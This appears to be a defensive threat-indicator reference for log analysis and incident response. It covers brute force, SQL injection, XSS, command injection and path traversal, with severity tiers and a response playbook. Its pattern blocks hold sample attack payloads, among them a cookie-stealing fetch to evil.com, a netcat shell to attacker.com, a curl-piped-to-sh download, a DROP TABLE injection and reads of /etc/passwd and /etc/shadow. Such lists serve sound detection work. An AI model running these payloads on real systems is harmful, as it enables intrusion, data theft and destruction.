# Threat Indicators Reference

## Attack Categories

### Brute Force Attacks
**Indicators:**
- 5+ failed login attempts from same IP within 5 minutes
- Sequential username enumeration (admin, root, test, user)
- Password spraying across multiple accounts
- Login attempts at unusual hours

**Response:**
1. Block offending IP at firewall
2. Enable account lockout after N failures
3. Implement CAPTCHA after 3 failures
4. Check if any attempts succeeded
5. Reset passwords for targeted accounts

### SQL Injection
**Common Patterns:**
```
' OR 1=1 --
UNION SELECT username, password FROM users
'; DROP TABLE users; --
' AND SLEEP(5) --
1' ORDER BY 1--+
```

**Log Indicators:**
- SQL keywords in URL parameters or POST data
- Comment sequences (-- or /* */) in input
- Boolean-based patterns (OR 1=1, AND 1=2)
- Time-based patterns (SLEEP, WAITFOR, BENCHMARK)

**Response:**
1. Block IP immediately
2. Review WAF rules
3. Audit application for parameterized queries
4. Check database for unauthorized changes
5. Review database access logs

### Cross-Site Scripting (XSS)
**Common Patterns:**
```
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
"><script>fetch('http://evil.com/'+document.cookie)</script>
```

**Response:**
1. Block IP
2. Review output encoding in application
3. Check for stored XSS in database
4. Implement Content Security Policy headers

### Command Injection
**Common Patterns:**
```
; cat /etc/passwd
| nc attacker.com 4444
$(whoami)
`id`
; curl http://evil.com/shell.sh | sh
```

**Response:**
1. Block IP immediately (highest priority)
2. Check if commands executed successfully
3. Audit system for unauthorized changes
4. Review application for shell execution paths

### Path Traversal
**Common Patterns:**
```
../../etc/passwd
..%2f..%2fetc/shadow
....//....//etc/passwd
%252e%252e%252fetc/passwd
```

**Response:**
1. Block IP
2. Check if sensitive files were accessed
3. Review file access controls
4. Validate path inputs in application

## Severity Classification

### Critical
- Active exploitation with evidence of success
- SQL injection with UNION/SELECT returning data
- Command injection with shell commands
- Data exfiltration indicators

### High
- Brute force with 10+ attempts
- XSS attempts with sophisticated payloads
- Path traversal reaching sensitive files
- Privilege escalation attempts

### Medium
- Admin page probing (404s on /admin, /wp-admin)
- Moderate brute force (3-9 attempts)
- Scanner/bot fingerprints
- Unusual access patterns

### Low
- Single failed login
- Normal 404 errors
- Known bot traffic (search engines)
- Rate slightly above average

## Common Log Formats

### Apache/Nginx Access Log
```
192.168.1.1 - - [01/Apr/2026:12:00:00 +0000] "GET /page HTTP/1.1" 200 1234
```

### Syslog/Auth Log
```
Apr  1 12:00:00 server sshd[12345]: Failed password for root from 192.168.1.1
```

### JSON Structured Logs
```json
{"timestamp": "2026-04-01T12:00:00Z", "level": "warn", "source_ip": "192.168.1.1", "message": "auth_failure"}
```

## IP Reputation Indicators

### Suspicious Patterns
- Multiple failed auth from same IP
- Requests to multiple admin paths
- Non-browser User-Agents (sqlmap, nikto, nmap)
- Rapid sequential requests (>100/min)
- Requests to honeypot URLs

### Known Scanner User-Agents
```
sqlmap
nikto
nmap
masscan
ZmEu
dirbuster
gobuster
wfuzz
```

## Incident Response Playbook

### Step 1: Detect
- Automated log analysis
- Alert thresholds triggered
- User/admin report

### Step 2: Triage
- Classify severity
- Identify affected systems
- Determine if ongoing

### Step 3: Contain
- Block attacker IP(s)
- Disable compromised accounts
- Isolate affected systems

### Step 4: Investigate
- Full log analysis across all sources
- Timeline reconstruction
- Impact assessment

### Step 5: Remediate
- Patch vulnerabilities
- Reset credentials
- Update WAF rules
- Restore from clean backups if needed

### Step 6: Report
- Document timeline and impact
- Identify root cause
- Recommend preventive measures
